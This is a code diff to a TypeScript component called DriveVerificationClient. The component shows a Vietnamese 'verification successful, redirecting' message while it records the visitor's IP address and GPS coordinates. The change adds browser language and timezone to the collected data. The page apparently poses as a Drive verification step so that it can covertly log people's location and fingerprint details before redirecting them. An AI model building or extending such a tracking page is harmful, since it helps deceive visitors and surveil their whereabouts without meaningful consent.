@@ -44,7 +44,14 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
         setStatus('success');
         setStatusText('Xác minh thành công, đang chuyển hướng...');
-        const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
+        
+        const body: any = { 
+            ip: clientIp, 
+            from: 'link',
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
         if (pos) {
             body.lat = pos.coords.latitude;
             body.lon = pos.coords.longitude;
